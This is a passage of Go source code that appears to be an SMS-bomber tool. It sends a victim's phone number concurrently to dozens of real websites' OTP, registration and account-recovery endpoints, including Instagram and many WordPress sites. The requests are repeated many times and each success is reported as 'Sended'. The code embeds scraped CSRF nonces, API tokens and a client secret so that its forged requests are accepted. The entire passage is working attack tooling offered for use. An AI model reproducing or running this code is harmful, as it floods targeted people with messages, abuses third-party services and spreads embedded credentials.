		go sms("https://crm.see5.net/api_ajax/sendotp.php", map[string]interface{}{
			s27: phone,
		}, ch)
		s28 := fmt.Sprintf("'mobileNumber': %s,'ReSendSMS': 'False'", phone)
		go sms("https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{
			s28: phone,
		}, ch)
		s29 := fmt.Sprintf("'mobileNumber': %s,'country': '1'", phone)
		go sms("https://my.limoome.com/api/auth/login/otp", map[string]interface{}{
			s29: phone,
		}, ch)
		s30 := fmt.Sprintf("_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile=%s&recaptcha=", phone)
		go sms("https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", map[string]interface{}{
			s30: phone,
		}, ch)
		s32 := fmt.Sprintf("number=%s&state=number&", phone)
		go sms("https://i.devslop.app/app/ifollow/api/otp.php/", map[string]interface{}{
			s32: phone,
		}, ch)
		s33 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=3b4194a8bb&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_%D9%81%DB%8C%D9%84%D8%AF%D9%85%D8%AA%D9%86%DB%8C1642498931181=Nvgu&digregcode=%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=3b4194a8bb", phone, phone)
		go sms("https://behzadshami.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s33: phone,
		}, ch)
		s34 := fmt.Sprintf("'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username':%s", phone)
		go sms("https://restaurant.delino.com/user/register", map[string]interface{}{
			s34: phone,
		}, ch)
		go sms("http://shop.tnovin.com/login", map[string]interface{}{
			"phone": phone,
		}, ch)
		s35 := fmt.Sprintf("'mobile':%s,'countryCode':98,'device_os':2", phone)
		go sms("https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{
			s35: phone,
		}, ch)
		s36 := fmt.Sprintf("fullname=%D9%85%D9%85%D8%AF&phoneNumber=%s&register=", phone)
		go sms("https://hamlex.ir/register.php", map[string]interface{}{
			s36: phone,
		}, ch)
		s37 := fmt.Sprintf("againkey=%s&cache=false", phone)
		go sms("https://moshaveran724.ir/m/pms.php", map[string]interface{}{
			s37: phone,
		}, ch)
		s38 := fmt.Sprintf("'phone_number':%s,'os_type':'W'", phone)
		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
			s38: phone,
		}, ch)
		s39 := fmt.Sprintf("'userKey':%s,'userKeyType':1", phone)
		go sms("https://app.flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
			s39: phone,
		}, ch)
		s40 := fmt.Sprintf("mobile=%s&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1", phone)
		go sms("https://www.foodcenter.ir/account/sabtmobile", map[string]interface{}{
			s40: phone,
		}, ch)

		s41 := fmt.Sprintf("'mobileOrEmail':%s,'deviceCode':'d520c7a8-421b-4563-b955-f5abc56b97ec','firstName':'','lastName':'','password':''", phone)
		go sms("https://auth.homtick.com/api/V1/User/GetVerifyCode", map[string]interface{}{
			s41: phone,
		}, ch)
		s42 := fmt.Sprintf("'optype':15,'userid':0,'mobile':%s,'firstname':'','lastname':'','cityid':0,'email':'','birthdate':'','gender':'False','avatarid':0,'packagename':'','versioncode':-1,'tokenkey':'','username':'','password':'','connectionname':'MainConStr'", phone)
		go sms("https://app.kardoon.ir:4433/api/users", map[string]interface{}{
			s42: phone,
		}, ch)
		s43 := fmt.Sprintf("'phoneNumber':%s,'email':''", phone)
		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
			s43: phone,
		}, ch)
		s44 := fmt.Sprintf("'Token':'5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c','DeviceId':1,'PhoneNumber':%s,'Helper':77942", phone)
		go sms("https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", map[string]interface{}{
			s44: phone,
		}, ch)
		s45 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=%s&dig_otp=&dig_nounce=54dfdabe34", phone, phone)
		go sms("https://ashraafi.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s45: phone,
		}, ch)
		s46 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=ec10ccb02a&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=%s&digits_reg_password=fuckYOU&dig_otp=&code=&dig_reg_mail=&dig_nounce=ec10ccb02a", phone, phone)
		go sms("https://bandarazad.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s46: phone,
		}, ch)
		s47 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail=%s&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2", phone, phone)
		go sms("https://bazidone.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s47: phone,
		}, ch)
		s48 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B98&digits_reg_mail=%s&digregscode2=%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4", phone, phone)
		go sms("https://www.bigtoys.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			s48: phone,
		}, ch)
		go sms(fmt.Sprintf("https://bitex24.com/api/v1/auth/sendSms?mobile=%s&dial_code=0", phone), map[string]interface{}{
			"esfelurm": "esfelurm",
		}, ch)
		s49 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3", phone, phone)
		go sms("https://farsgraphic.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s49: phone,
		}, ch)
		s50 := fmt.Sprintf("email_or_username=%2B%s&recaptcha_challenge_field=&flow=&app_id=&source_account_id=", phone)
		go sms("https://www.instagram.com/accounts/account_recovery_send_ajax/", map[string]interface{}{
			s50: phone,
		}, ch)
		s51 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=d33076d828&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=%s&digits_reg_password=mahyar125&dig_otp=&code=&dig_reg_mail=&dig_nounce=d33076d828", phone, phone)
		go sms("https://shop.hemat-elec.ir/wp-admin/admin-ajax.php", map[string]interface{}{
			s51: phone,
		}, ch)
		s52 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=%s&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72", phone, phone)
		go sms("https://www.mipersia.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s52: phone,
		}, ch)
		s53 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=18551366bc&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_lastname=%D9%84%D8%A8%D8%A8%DB%8C%DB%8C%D8%A8%D8%AB%D9%82%D8%AD&digits_reg_displayname=%D8%A8%D8%A8%D8%A8%DB%8C%D8%B1%D8%A8%D9%84%D9%84%DB%8C%D8%A8%D9%84&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail=%s&digits_reg_password=&digits_reg_avansbirthdate=2003-03-21&jalali_digits_reg_avansbirthdate1867119037=1382-01-01&dig_otp=&code=&dig_reg_mail=&dig_nounce=18551366bc", phone, phone)
		go sms("https://www.kodakamoz.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s53: phone,
		}, ch)
		s54 := fmt.Sprintf("mobile=%s&password=mamad1234", phone)
		go sms("https://tajtehran.com/RegisterRequest", map[string]interface{}{
			s54: phone,
		}, ch)
		s55 := fmt.Sprintf("action=digits_check_mob&countrycode=%2B98&mobileNo=%s&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail=%s&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b", phone, phone)
		go sms("https://zivanpet.com/wp-admin/admin-ajax.php", map[string]interface{}{
			s55: phone,
		}, ch)
		s56 := fmt.Sprintf("'mobile':%s,'deviceTypeCode':0,'confirmTerms':'True','notRobot':'False'", phone)
		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
			s56: phone,
		}, ch)
		go sms("https://client.api.paklean.com/user/resendVoiceCode", map[string]interface{}{
			"username": phone,
		}, ch)
		go sms("https://web.raghamapp.com/api/users/code", map[string]interface{}{
			"phone": phone,
		}, ch)
		go sms("https://gateway.trip.ir/api/registers", map[string]interface{}{
			"CellPhone": phone,
		}, ch)
		go sms("https://gateway.trip.ir/api/Totp", map[string]interface{}{
			"PhoneNumber": phone,
		}, ch)

	}

	for i := 0; i < repeatCount*183; i++ {
		statusCode := <-ch
		if statusCode == 404 || statusCode == 400 {
			fmt.Println("\033[01;31m[-] Error ! ")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}

	}
}

/*
End !
